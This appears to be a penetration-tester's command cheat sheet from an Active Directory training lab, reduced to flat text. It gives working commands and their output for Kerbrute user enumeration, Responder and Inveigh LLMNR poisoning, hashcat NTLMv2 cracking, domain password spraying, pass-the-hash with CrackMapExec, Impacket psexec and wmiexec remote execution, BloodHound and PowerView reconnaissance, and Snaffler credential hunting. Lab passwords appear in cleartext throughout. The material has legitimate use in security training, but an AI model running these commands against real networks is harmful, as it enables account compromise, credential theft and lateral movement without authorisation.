Make Windows, Linux and Mac x86/x64 Binaries cube111@local[/local]$ sudo make all go: downloading github.com/spf13/cobra v1.1.1 go: downloading github.com/op/go-logging v0.0.0-20160315200505-970db520ece7 go: downloading github.com/ropnop/gokrb5/v8 v8.0.0-20201111231119-729746023c02 go: downloading github.com/spf13/pflag v1.0.5 go: downloading github.com/jcmturner/gofork v1.0.0 go: downloading github.com/hashicorp/go-uuid v1.0.2 go: downloading golang.org/x/crypto v0.0.0-20201016220609-9e8e0b390897 go: downloading github.com/jcmturner/rpc/v2 v2.0.2 go: downloading github.com/jcmturner/dnsutils/v2 v2.0.0 go: downloading github.com/jcmturner/aescts/v2 v2.0.0 go: downloading golang.org/x/net v0.0.0-20200114155413-6afb5195e5aa cd /tmp/kerbrute rm -f kerbrute kerbrute.exe kerbrute kerbrute.exe kerbrute.test kerbrute.test.exe kerbrute.test kerbrute.test.exe main main.exe rm -f /root/go/bin/kerbrute Done. Building for windows amd64.. get wordlists from here https://github.com/ropnop/kerbrute\nhttps://github.com/insidetrust/statistically-likely-usernames\nUSE KERBRUTE\ncube111@local[/local]$ kerbrute userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt -o valid_ad_users 2021/11/17 23:01:46 \u003e Using KDC(s): 2021/11/17 23:01:46 \u003e 172.16.5.5:88 2021/11/17 23:01:46 \u003e [+] VALID USERNAME: jjones@INLANEFREIGHT.LOCAL 2021/11/17 23:01:46 \u003e [+] VALID USERNAME: sbrown@INLANEFREIGHT.LOCAL 2021/11/17 23:01:46 \u003e [+] VALID USERNAME: tjohnson@INLANEFREIGHT.LOCAL 2021/11/17 23:01:50 \u003e [+] VALID USERNAME: evalentin@INLANEFREIGHT.LOCAL \u003cSNIP\u003e 2021/11/17 23:01:51 \u003e [+] VALID USERNAME: sgage@INLANEFREIGHT.LOCAL 2021/11/17 23:01:51 \u003e [+] VALID USERNAME: jshay@INLANEFREIGHT.LOCAL 2021/11/17 23:01:51 \u003e [+] VALID USERNAME: jhermann@INLANEFREIGHT.LOCAL 2021/11/17 23:01:51 \u003e [+] VALID USERNAME: whouse@INLANEFREIGHT.LOCAL 2021/11/17 23:01:51 \u003e [+] VALID USERNAME: emercer@INLANEFREIGHT.LOCAL 2021/11/17 23:01:52 \u003e [+] VALID USERNAME: wshepherd@INLANEFREIGHT.LOCAL 2021/11/17 23:01:56 \u003e Done! Tested 48705 usernames (56 valid) in 9.940 second LLMNR/NBT-NS Poisoning - from Linux UDP 137, UDP 138, UDP 53, UDP/TCP 389,TCP 1433, UDP 1434, TCP 80, TCP 135, TCP 139, TCP 445, TCP 21, TCP 3141,TCP 25, TCP 110, TCP 587, TCP 3128, Multicast UDP 5355 and 5353 Starting Responder with Default Settings Code: bash\nsudo responder -I ens224 Cracking an NTLMv2 Hash With Hashcat LLMNR/NBT-NS Poisoning - from Linux\ncube111@local[/local]$ hashcat -m 5600 forend_ntlmv2 /usr/share/wordlists/rockyou.txt hashcat (v6.1.1) starting... \u003cSNIP\u003e Dictionary cache hit: * Filename..: /usr/share/wordlists/rockyou.txt * Passwords.: 14344385 * Bytes.....: 139921507 * Keyspace..: 14344385 LLMNR/NBT-NS Poisoning - from Windows PS C:\\local\u003e Import-Module .\\Inveigh.ps1 PS C:\\local\u003e Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y [*] Inveigh 1.506 started at 2022-02-28T19:26:30 [+] Elevated Privilege Mode = Enabled [+] Primary IP Address = 172.16.5.25 [+] Spoofer IP Address = 172.16.5.25 [+] ADIDNS Spoofer = Disabled [+] DNS Spoofer = Enabled [+] DNS TTL = 30 Seconds C# tool\nPS C:\\local\u003e .\\Inveigh.exe [*] Inveigh 2.0.4 [Started 2022-02-28T20:03:28 | PID 6276] [+] Packet Sniffer Addresses [IP 172.16.5.25 | IPv6 fe80::dcec:2831:712b:c9a3%8] [+] Listener Addresses [IP 0.0.0.0 | IPv6 ::] [+] Spoofer Reply Addresses [IP 172.16.5.25 | IPv6 fe80::dcec:2831:712b:c9a3%8] [+] Spoofer Options [Repeat Enabled | Local Attacks Disabled] [ ] DHCPv6 [+] DNS Packet Sniffer [Type A] [ ] ICMPv6 [+] LLMNR Packet Sniffer [Type A] [ ] MDNS [ ] NBNS [+] HTTP Listener [HTTPAuth NTLM | WPADAuth NTLM | Port 80] [ ] HTTPS [+] WebDAV [WebDAVAuth NTLM] [ ] Proxy [+] LDAP Listener [Port 389] Enumerating the Password Policy - from Linux - Credentialed crackmapexec smb 172.16.5.5 -u avazquez -p Password123 --pass-pol rpcclient -U \"\" -N 172.16.5.5 rpcclient $\u003e querydominfo Domain:\tINLANEFREIGHT Server:\tComment:\tTotal Users:\t3650 Total Groups:\t0 Total Aliases:\t37 Sequence No:\t1 Force Logoff:\t-1 Domain Server State:\t0x1 Server Role:\tROLE_DOMAIN_PDC Unknown 3:\t0x1 rpcclient $\u003e getdompwinfo min_password_length: 8 password_properties: 0x00000001 DOMAIN_PASSWORD_COMPLEX Using enum4linux Enumerating \u0026 Retrieving Password Policies\ncube111@local[/local]$ enum4linux -P 172.16.5.5 \u003cSNIP\u003e ================================================== | Password Policy Information for 172.16.5.5 | ================================================== [+] Attaching to 172.16.5.5 using a NULL share [+] Trying protocol 139/SMB... [!] Protocol failed: Cannot request session (Called Name:172.16.5.5) [+] Trying protocol 445/SMB... [+] Found domain(s): [+] INLANEFREIGHT [+] Builtin [+] Password Info for Domain: INLANEFREIGHT [+] Minimum password length: 8 [+] Password history length: 24 [+] Maximum password age: Not Set [+] Password Complexity Flags: 000001 [+] Domain Refuse Password Change: 0 [+] Domain Password Store Cleartext: 0 [+] Domain Password Lockout Admins: 0 [+] Domain Password No Clear Change: 0 [+] Domain Password No Anon Change: 0 [+] Domain Password Complex: 1 [+] Minimum password age: 1 day 4 minutes [+] Reset Account Lockout Counter: 30 minutes [+] Locked Account Durati Using ldapsearch cube111@local[/local]$ ldapsearch -h 172.16.5.5 -x -b \"DC=INLANEFREIGHT,DC=LOCAL\" -s sub \"*\" | grep -m 1 -B 10 pwdHistoryLength Enumerating the Password Policy - from Windows net accounts Using PowerView Enumerating \u0026 Retrieving Password Policies\nPS C:\\local\u003e import-module .\\PowerView.ps1 PS C:\\local\u003e Get-DomainPolicy Unicode : @{Unicode=yes} SystemAccess : @{MinimumPasswordAge=1; MaximumPasswordAge=-1; MinimumPasswordLength=8; PasswordComplexity=1; PasswordHistorySize=24; LockoutBadCount=5; ResetLockoutCount=30; LockoutDuration=30; RequireLogonToChangePassword=0; ForceLogoffWhenHourExpire=0; ClearTextPassword=0; LSAAnonymousNameLookup=0} KerberosPolicy : @{MaxTicketAge=10; MaxRenewAge=7; MaxServiceAge=600; MaxClockSkew=5; TicketValidateClient=1} Version : @{signature=\"$CHICAGO$\"; Revision=1} RegistryValues : @{MACHINE\\System\\CurrentControlSet\\Control\\Lsa\\NoLMHash=System.Object[]} Path : \\\\INLANEFREIGHT.LOCAL\\sysvol\\INLANEFREIGHT.LOCAL\\Policies\\{31B2F340-016D-11D2-945F-00C04FB984F9}\\MACHI NE\\Microsoft\\Windows NT\\SecEdit\\GptTmpl.inf GPOName : {31B2F340-016D-11D2-945F-00C04FB984F9} GPODisplayName : Default Domain Policy Detailed User Enumeration By leveraging an SMB NULL session to retrieve a complete list of domain users from the domain controller Utilizing an LDAP anonymous bind to query LDAP anonymously and pull down the domain user list Using a tool such as Kerbrute to validate users utilizing a word list from a source such as the statistically-likely-usernames GitHub repo, or gathered by using a tool such as linkedin2username to create a list of potentially valid users Using a set of credentials from a Linux or Windows attack system either provided by our client or obtained through another means such as LLMNR/NBT-NS response poisoning using Responder or even a successful password spray using a smaller wordlist cube111@local[/local]$ enum4linux -U 172.16.5.5 | grep \"user:\" | cut -f2 -d\"[\" | cut -f1 -d\"]\" administrator guest krbtgt lab_adm local-student avazquez pfalcon fanthony wdillard lbradford sgage asanchez dbranch ccruz njohnson mholliday cube111@local[/local]$ rpcclient -U \"\" -N 172.16.5.5 rpcclient $\u003e enumdomusers user:[administrator] rid:[0x1f4] user:[guest] rid:[0x1f5] user:[krbtgt] rid:[0x1f6] user:[lab_adm] rid:[0x3e9] user:[local-student] rid:[0x457] user:[avazquez] rid:[0x458] cube111@local[/local]$ crackmapexec smb 172.16.5.5 --users SMB 172.16.5.5 445 ACADEMY-EA-DC01 [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False) SMB 172.16.5.5 445 ACADEMY-EA-DC01 [+] Enumerated domain user(s) SMB 172.16.5.5 445 ACADEMY-EA-DC01 INLANEFREIGHT.LOCAL\\administrator badpwdcount: 0 baddpwdtime: 2022-01-10 13:23:09.463228 SMB 172.16.5.5 445 ACADEMY-EA-DC01 INLANEFREIGHT.LOCAL\\guest badpwdcount: 0 baddpwdtime: 1600-12-31 19:03:58 SMB 172.16.5.5 445 ACADEMY-EA-DC01 INLANEFREIGHT.LOCAL\\lab_adm badpwdcount: 0 baddpwdtime: 2021-12-21 14:10:56.859064 SMB 172.16.5.5 445 ACADEMY-EA-DC01 INLANEFREIGHT.LOCAL\\krbtgt badpwdcount: 0 baddpwdtime: 1600-12-31 19:03:58 SMB 172.16.5.5 445 ACADEMY-EA-DC01 INLANEFREIGHT.LOCAL\\local-student badpwdcount: 0 baddpwdtime: 2022-02-22 14:48:26.653366 SMB 172.16.5.5 445 ACADEMY-EA-DC01 INLANEFREIGHT.LOCAL\\avazquez badpwdcount: 0 baddpwdtime: 2022-02-17 22:59:22.684613 \u003cSNIP\u003e cube111@local[/local]$ ldapsearch -H ldap://10.10.10.172 -x -b \"DC=MEGABANK,DC=LOCAL\" -s sub \"(\u0026(objectclass=user))\" | grep sAMAccountName | awk '{print $2}' \u003e usernames.txt guest ACADEMY-EA-DC01$ ACADEMY-EA-MS01$ ACADEMY-EA-WEB01$ local-student avazquez pfalcon fanthony wdillard lbradford sgage asanchez dbranch ldapsearch -H ldap://172.16.5.5 -x -D \"local-student@INLANEFREIGHT.LOCAL\" -W -b \"DC=INLANEFREIGHT,DC=LOCAL\" -s sub \"(\u0026(objectclass=user)(!(objectClass=computer)))\" sAMAccountName | grep sAMAccountName: | cut -f2 -d' ' | sort -u cube111@local[/local]$ ./windapsearch.py --dc-ip 172.16.5.5 -u \"\" -U [+] No username provided. Will try anonymous bind. [+] Using Domain Controller at: 172.16.5.5 [+] Getting defaultNamingContext from Root DSE [+]\tFound: DC=INLANEFREIGHT,DC=LOCAL [+] Attempting bind [+]\t...success! Binded as: [+]\tNone [+] Enumerating all AD users [+]\tFound 2906 users: cn: Guest cn: local Student userPrincipalName: local-student@inlanefreight.local cn: Annie Vazquez userPrincipalName: avazquez@inlanefreight.local cn: Paul Falcon userPrincipalName: pfalcon@inlanefreight.local cn: Fae Anthony userPrincipalName: fanthony@inlanefreight.local cn: Walter Dillard userPrincipalName: wdillard@inlanefreight.local \u003cSNIP\u003e cube111@local[/local]$ python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 --da cube111@local[/local]$ kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt __ __ __ / /_____ _____/ /_ _______ __/ /____ / //_/ _ \\/ ___/ __ \\/ ___/ / / / __/ _ \\ / ,\u003c / __/ / / /_/ / / / /_/ / /_/ __/ /_/|_|\\___/_/ /_.___/_/ \\__,_/\\__/\\___/ Version: dev (9cfb81e) - 02/17/22 - Ronnie Flathers @ropnop 2022/02/17 22:16:11 \u003e Using KDC(s): 2022/02/17 22:16:11 \u003e 172.16.5.5:88 2022/02/17 22:16:11 \u003e [+] VALID USERNAME:\tjjones@inlanefreight.local 2022/02/17 22:16:11 \u003e [+] VALID USERNAME:\tsbrown@inlanefreight.local 2022/02/17 22:16:11 \u003e [+] VALID USERNAME:\ttj Internal Password Spraying - from Linux for u in $(cat valid_users.txt);do rpcclient -U \"$u%Welcome1\" -c \"getusername;quit\" 172.16.5.5 | grep Authority; done Using Kerbrute for the Attack [!bash!]$ kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt Welcome1 __ __ __ / /_____ _____/ /_ _______ __/ /____ / //_/ _ \\/ ___/ __ \\/ ___/ / / / __/ _ \\ / ,\u003c / __/ / / /_/ / / / /_/ / /_/ __/ /_/|_|\\___/_/ /_.___/_/ \\__,_/\\__/\\___/ Version: dev (9cfb81e) - 02/17/22 - Ronnie Flathers @ropnop 2022/02/17 22:57:12 \u003e Using KDC(s): 2022/02/17 22:57:12 \u003e 172.16.5.5:88 2022/02/17 22:57:12 \u003e [+] VALID LOGIN:\tsgage@inlanefreight.local:Welcome1 2022/02/17 22:57:12 \u003e Done! Tested 57 logins (1 successes) in 0.172 seconds [!bash!]$ sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep + SMB 172.16.5.5 445 ACADEMY-EA-DC01 [+] INLANEFREIGHT.LOCAL\\avazquez:Password123 Local Admin Spraying with CrackMapExec [!bash!]$ sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep + Using DomainPasswordSpray.ps1 PS C:\\local\u003e Import-Module .\\DomainPasswordSpray.ps1 PS C:\\local\u003e Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue [*] Current domain is compatible with Fine-Grained Password Policy. [*] Now creating a list of users to spray... [*] The smallest lockout threshold discovered in the domain is 5 login attempts. [*] Removing disabled users from list. [*] There are 2923 total users found. [*] Removing users within 1 attempt of locking out from list. [*] Created a userlist containing 2923 users gathered from the current user's domain [*] The domain password policy observation window is set to minutes. [*] Setting a minute wait in between sprays. Confirm Password Spray Are you sure you want to perform a password spray against 2923 accounts? [Y] Yes [N] No [?] Help (default is \"Y\"): Y [*] Password spraying has begun with 1 passwords [*] This might take a while depending on the total number of users [*] Now trying password Welcome1 against 2923 users. Current time is 2:57 PM [*] Writing successes to spray_success [*] SUCCESS! User:sgage Password:Welcome1 [*] SUCCESS! User:tjohnson Password:Welcome1 [*] Password spraying is complete [*] Any passwords that were successfully sprayed have been output to spray_success Enumerating Security Controls PS C:\\local\u003e Get-MpComputerStatus AMEngineVersion : 1.1.17400.5 AMProductVersion : 4.10.14393.0 AMServiceEnabled : True AMServiceVersion : 4.10.14393.0 AntispywareEnabled : True AntispywareSignatureAge : 1 AntispywareSignatureLastUpdated : 9/2/2020 11:31:50 AM AntispywareSignatureVersion : 1.323.392.0 AntivirusEnabled : True AntivirusSignatureAge : 1 AntivirusSignatureLastUpdated : 9/2/2020 11:31:51 AM AntivirusSignatureVersion : 1.323.392.0 BehaviorMonitorEnabled : False ComputerID : 07D23A51-F83F-4651-B9ED-110FF2B83A9C ComputerState : 0 FullScanAge : 4294967295 Using Get-AppLockerPolicy cmdlet PS C:\\local\u003e Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections PathConditions : {%SYSTEM32%\\WINDOWSPOWERSHELL\\V1.0\\POWERSHELL.EXE} PathExceptions : {} PublisherExceptions : {} HashExceptions : {} Id : 3d57af4a-6cf8-4e5b-acfc-c2c2956061fa Name : Block PowerShell Description : Blocks Domain Users from using PowerShell on workstations UserOrGroupSid : S-1-5-21-2974783224-3764228556-2640795941-513 Action : Deny PathConditions : {%PROGRAMFILES%\\*} PathExceptions PowerShell Constrained Language Mode PS C:\\local\u003e $ExecutionContext.SessionState.LanguageMode ConstrainedLanguage LAPS PS C:\\local\u003e Find-LAPSDelegatedGroups OrgUnit Delegated Groups ------- ---------------- OU=Servers,DC=INLANEFREIGHT,DC=LOCAL INLANEFREIGHT\\Domain Admins OU=Servers,DC=INLANEFREIGHT,DC=LOCAL INLANEFREIGHT\\LAPS Admins OU=Workstations,DC=INLANEFREIGHT,DC=LOCAL INLANEFREIGHT\\Domain Admins OU=Workstations,DC=INLANEFREIGHT,DC=LOCAL INLANEFREIGHT\\LAPS Admins OU=Web Servers,OU=Servers,DC=INLANEFREIGHT,DC=LOCAL INLANEFREIGHT\\Domain Admins OU=Web Servers,OU=Servers,DC=INLANEFREIGHT,DC=LOCAL INLANEFREIGHT\\LAPS Admins OU=SQL Servers,OU=Servers,DC=INLANEFREIGHT,DC=LOCAL INLANEFREIGHT\\Domain Admins OU=SQL Servers,OU=Servers,DC=INLANEFREIGHT,DC=LOCAL INLANEFREIGHT\\LAPS Admins OU=File Servers,OU=Servers,DC=INLANEFREIGHT,DC=L... INLANEFREIGHT\\Domain Admins OU=File Servers,OU=Servers,DC=INLANEFREIGHT,DC=L... INLANEFREIGHT\\LAPS Admins OU=Contractor Laptops,OU=Workstations,DC=INLANEF... INLANEFREIGHT\\Domain Admins OU=Contractor La PS C:\\local\u003e Find-AdmPwdExtendedRights ComputerName Identity Reason ------------ -------- ------ EXCHG01.INLANEFREIGHT.LOCAL INLANEFREIGHT\\Domain Admins Delegated EXCHG01.INLANEFREIGHT.LOCAL INLANEFREIGHT\\LAPS Admins Delegated SQL01.INLANEFREIGHT.LOCAL INLANEFREIGHT\\Domain Admins Delegated SQL01.INLANEFREIGHT.LOCAL INLANEFREIGHT\\LAPS Admins Delegated WS01.INLANEFREIGHT.LOCAL INLANEFREIGHT\\Domain Admins Delegated WS01.INLANEFREIGHT.LOCAL INLANEFREIGHT\\LAPS Admins Delegated PS C:\\local\u003e Get-LAPSComputers ComputerName Password Expiration ------------ -------- ------- Credentialed Enumeration - from Linux cube111@local[/local]$ sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --users SMB 172.16.5.5 445 ACADEMY-EA-DC01 [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False) SMB 172.16.5.5 445 ACADEMY-EA-DC01 [+] INLANEFREIGHT.LOCAL\\forend:Klmcargo2 SMB 172.16.5.5 445 ACADEMY-EA-DC01 [+] Enumerated domain user(s) SMB 172.16.5.5 445 ACADEMY-EA-DC01 INLANEFREIGHT.LOCAL\\administrator badpwdcount: 0 baddpwdtime: 2022-03-29 12:29:14.476567 SMB 172.16.5.5 445 ACADEMY-EA-DC01 INLANEFREIGHT.LOCAL\\guest badpwdcount: 0 baddpwdtime: 1600-12-31 19:03:58 SMB 172.16.5.5 445 ACADEMY-EA-DC01 INLANEFREIGHT.LOCAL\\lab_adm badpwdcount: 0 baddpwdtime: 2022-04-09 23:04:58.611828 SMB 172.16.5.5 445 ACADEMY-EA-DC01 INLANEFREIGHT.LOCAL\\krbtgt badpwdcount: 0 baddpwdtime: 1600-12-31 19:03:58 SMB 172.16.5.5 445 ACADEMY-EA-DC01 INLANEFREIGHT.LOCAL\\local-student badpwdcount: 0 baddpwdtime: 2022-03-30 16:27:41.960920 SMB 172.16.5.5 445 ACADEMY-EA-DC01 INLANEFREIGHT.LOCAL\\avazquez cube111@local[/local]$ sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --groups SMB 172.16.5.5 445 ACADEMY-EA-DC01 [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False) SMB 172.16.5.5 445 ACADEMY-EA-DC01 [+] INLANEFREIGHT.LOCAL\\forend:Klmcargo2 SMB 172.16.5.5 445 ACADEMY-EA-DC01 [+] Enumerated domain group(s) SMB 172.16.5.5 445 ACADEMY-EA-DC01 Administrators membercount: 3 SMB 172.16.5.5 445 ACADEMY-EA-DC01 Users membercount: 4 SMB 172.16.5.5 445 ACADEMY-EA-DC01 Guests membercount: 2 SMB 172.16.5.5 445 ACADEMY-EA-DC01 Print Operators membercount: 0 SMB 172.16.5.5 445 ACADEMY-EA-DC01 Backup Operators membercount: 1 SMB 172.16.5.5 445 ACADEMY-EA-DC01 Replicator membercount: 0 \u003cSNIP\u003e SMB 172.16.5.5 445 ACADEMY-EA-DC01 Domain Admins cube111@local[/local]$ sudo crackmapexec smb 172.16.5.130 -u forend -p Klmcargo2 --loggedon-users SMB 172.16.5.130 445 ACADEMY-EA-FILE [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-FILE) (domain:INLANEFREIGHT.LOCAL) (signing:False) (SMBv1:False) SMB 172.16.5.130 445 ACADEMY-EA-FILE [+] INLANEFREIGHT.LOCAL\\forend:Klmcargo2 (Pwn3d!) SMB 172.16.5.130 445 ACADEMY-EA-FILE [+] Enumerated loggedon users SMB 172.16.5.130 445 ACADEMY-EA-FILE INLANEFREIGHT\\clusteragent logon_server: ACADEMY-EA-DC01 SMB 172.16.5.130 445 ACADEMY-EA-FILE INLANEFREIGHT\\lab_adm logon_server: ACADEMY-EA-DC01 SMB 172.16.5.130 445 ACADEMY-EA-FILE INLANEFREIGHT\\svc_qualys logon_server: ACADEMY-EA-DC01 SMB 172.16.5.130 445 ACADEMY-EA-FILE INLANEFREIGHT\\wley logon_server: ACADEMY-EA-DC01 cube111@local[/local]$ sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --shares SMB 172.16.5.5 445 ACADEMY-EA-DC01 [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False) SMB 172.16.5.5 445 ACADEMY-EA-DC01 [+] INLANEFREIGHT.LOCAL\\forend:Klmcargo2 SMB 172.16.5.5 445 ACADEMY-EA-DC01 [+] Enumerated shares SMB 172.16.5.5 445 ACADEMY-EA-DC01 Share Permissions Remark SMB 172.16.5.5 445 ACADEMY-EA-DC01 ----- ----------- ------ SMB 172.16.5.5 445 ACADEMY-EA-DC01 ADMIN$ Remote Admin SMB 172.16.5.5 445 ACADEMY-EA-DC01 C$ Default share SMB 172.16.5.5 445 ACADEMY-EA-DC01 Department Shares READ SMB 172.16.5.5 445 ACADEMY-EA-DC01 IPC$ READ Remote IPC SMB 172.16.5.5 445 ACADEMY-EA-DC01 NETLOGON READ Logon server share SMB 172.16.5.5 445 ACADEMY-EA-DC01 SYSVOL READ cube111@local[/local]$ sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share 'Department Shares' SMB 172.16.5.5 445 ACADEMY-EA-DC01 [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False) SMB 172.16.5.5 445 ACADEMY-EA-DC01 [+] INLANEFREIGHT.LOCAL\\forend:Klmcargo2 SPIDER_P... 172.16.5.5 445 ACADEMY-EA-DC01 [*] Started spidering plus with option: SPIDER_P... 172.16.5.5 445 ACADEMY-EA-DC01 [*] DIR: ['print$'] SPIDER_P... 172.16.5.5 445 ACADEMY-EA-DC01 [*] EXT: ['ico', 'lnk'] SPIDER_P... 172.16.5.5 445 ACADEMY-EA-DC01 [*] SIZE: 51200 SPIDER_P... 172.16.5.5 445 ACADEMY-EA-DC01 [*] OUTPUT: /tmp/cme_spider_plus SMBMap SMBMap To Check Access Credentialed Enumeration - from Linux\ncube111@local[/local]$ smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 [+] IP: 172.16.5.5:445\tName: inlanefreight.local Disk Permissions\tComment ---- -----------\t------- ADMIN$ NO ACCESS\tRemote Admin C$ NO ACCESS\tDefault share Department Shares READ ONLY\tIPC$ READ ONLY\tRemote IPC NETLOGON READ ONLY\tLogon server share SYSVOL READ ONLY\tLogon server share User Shares READ ONLY\tZZZ_archive READ ONLY Recursive List Of All Directories cube111@local[/local]$ smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R 'Department Shares' --dir-only [+] IP: 172.16.5.5:445\tName: inlanefreight.local Disk Permissions\tComment ---- -----------\t------- Department Shares READ ONLY rpcclient rpcclient -U \"\" -N 172.16.5.5 rpcclient $\u003e enumdomusers user:[administrator] rid:[0x1f4] user:[guest] rid:[0x1f5] user:[krbtgt] rid:[0x1f6] user:[lab_adm] rid:[0x3e9] Impacket Toolkit psexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.125 wmiexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.5 Bloodhound.py cube111@local[/local]$ sudo bloodhound-python -u 'forend' -p 'Klmcargo2' -ns 172.16.5.5 -d inlanefreight.local -c all INFO: Found AD domain: inlanefreight.local INFO: Connecting to LDAP server: ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL INFO: Found 1 domains INFO: Found 2 domains in the forest INFO: Found 564 computers INFO: Connecting to LDAP server: ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL INFO: Found 2951 users INFO: Connecting to GC LDAP server: ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL INFO: Found 183 groups INFO: Found 2 trusts INFO: Starting computer enumeration with 10 workers Credentialed Enumeration - from Windows Load ActiveDirectory Module Credentialed Enumeration - from Windows\nPS C:\\local\u003e Import-Module ActiveDirectory PS C:\\local\u003e Get-Module ModuleType Version Name ExportedCommands ---------- ------- ---- ---------------- Manifest 1.0.1.0 ActiveDirectory {Add-ADCentralAccessPolicyMember, Add-ADComputerServiceAcc... Manifest 3.1.0.0 Microsoft.PowerShell.Utility {Add-Member, Add-Type, Clear-Variable, Compare-Object...} Script 2.0.0 PSReadline Get-ADUser Credentialed Enumeration - from Windows\nPS C:\\local\u003e Get-ADUser -Filter {ServicePrincipalName -ne \"$null\"} -Properties ServicePrincipalName DistinguishedName : CN=adfs,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL Enabled : True GivenName : Sharepoint Name : adfs Checking For Trust Relationships Credentialed Enumeration - from Windows\nPS C:\\local\u003e Get-ADTrust -Filter * Direction : BiDirectional DisallowTransivity : False DistinguishedName : CN=LOGISTICS.INLANEFREIGHT.LOCAL,CN=System,DC=INLANEFREIGHT,DC=LOCAL ForestTransitive : False IntraForest : True IsTreeParent : False IsTreeRoot : False Name : LOGISTICS.INLANEFREIGHT.LOCAL ObjectClass : trustedDomain ObjectGUID : f48a1169-2e58-42c1-ba32-a6ccb10057ec SelectiveAuthentication User enumeration\nDetailed Group Info Credentialed Enumeration - from Windows\nPS C:\\local\u003e Get-ADGroup -Identity \"Backup Operators\" DistinguishedName : CN=Backup Operators,CN=Builtin,DC=INLANEFREIGHT,DC=LOCAL GroupCategory : Security GroupScope : DomainLocal Name : Backup Operators ObjectClass : group Group Membership Credentialed Enumeration - from Windows\nPS C:\\local\u003e Get-ADGroupMember -Identity \"Backup Operators\" distinguishedName : CN=BACKUPAGENT,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL name : BACKUPAGENT objectClass : user objectGUID : 2ec53e98-3a64-4706-be23-1d824ff61bed SamAccountName : backupagent PowerView Command Description Export-PowerViewCSV Append results to a CSV file ConvertTo-SID Convert a User or group name to its SID value Get-DomainSPNTicket Requests the Kerberos ticket for a specified Service Principal Name (SPN) account Domain/LDAP Functions: Get-Domain Will return the AD object for the current (or specified) domain Get-DomainController Return a list of the Domain Controllers for the specified domain Get-DomainUser Will return all users or specific user objects in AD Get-DomainComputer Will return all computers or specific computer objects in AD Get-DomainGroup Will return all groups or specific group objects in AD Get-DomainOU Search for all or specific OU objects in AD Find-InterestingDomainAcl Finds object ACLs in the domain with modification rights set to non-built in objects Get-DomainGroupMember Will return the members of a specific domain group Get-DomainFileServer Returns a list of servers likely functioning as file servers Get-DomainDFSShare Returns a list of all distributed file systems for the current (or specified) domain GPO Functions: Get-DomainGPO Will return all GPOs or specific GPO objects in AD Get-DomainPolicy Returns the default domain policy or the domain controller policy for the current domain Computer Enumeration Functions: Get-NetLocalGroup Enumerates local groups on the local or a remote machine Get-NetLocalGroupMember Enumerates members of a specific local group Get-NetShare Returns open shares on the local (or a remote) machine Get-NetSession Will return session information for the local (or a remote) machine Test-AdminAccess Tests if the current user has administrative access to the local (or a remote) machine Threaded ‚ÄòMeta‚Äô-Functions: Find-DomainUserLocation Finds machines where specific users are logged in Find-DomainShare Finds reachable shares on domain machines Find-InterestingDomainShareFile Searches for files matching specific criteria on readable shares in the domain Find-LocalAdminAccess Find machines on the local domain where the current user has local administrator access Domain Trust Functions: Get-DomainTrust Returns domain trusts for the current domain or a specified domain Get-ForestTrust Returns all forest trusts for the current forest or a specified forest Get-DomainForeignUser Enumerates users who are in groups outside of the user‚Äôs domain Get-DomainForeignGroupMember Enumerates groups with users outside of the group‚Äôs domain and returns each foreign member Get-DomainTrustMapping Will enumerate all trusts for the current domain and any others seen. user membership\nPS C:\\local\u003e Get-DomainUser -Identity mmorgan -Domain inlanefreight.local | Select-Object -Property name,samaccountname,description,memberof,whencreated,pwdlastset,lastlogontimestamp,accountexpires,admincount,userprincipalname,serviceprincipalname,useraccountcontrol name : Matthew Morgan samaccountname : mmorgan description : memberof : {CN=VPN Users,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL, CN=Shared Calendar Read,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL, CN=Printer Access,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL, CN=File Share H Drive,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL...} whencreated : 10/27/2021 5:37:06 PM pwdlastset : 11/18/2021 10:02:57 AM lastlogontimestamp : 2/27/2022 6:34:25 PM accountexpires : NEVER admincount : 1 userprincipalname : mmorgan@inlanefreight.local serviceprincipalname : mail : useraccountcontrol : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD, DONT_REQ_PREAUTH Password finder\nPS C:\\local\u003e .\\Snaffler.exe -d INLANEFREIGHT.LOCAL -s -v data .::::::.:::. :::. :::. .-:::::'.-:::::'::: 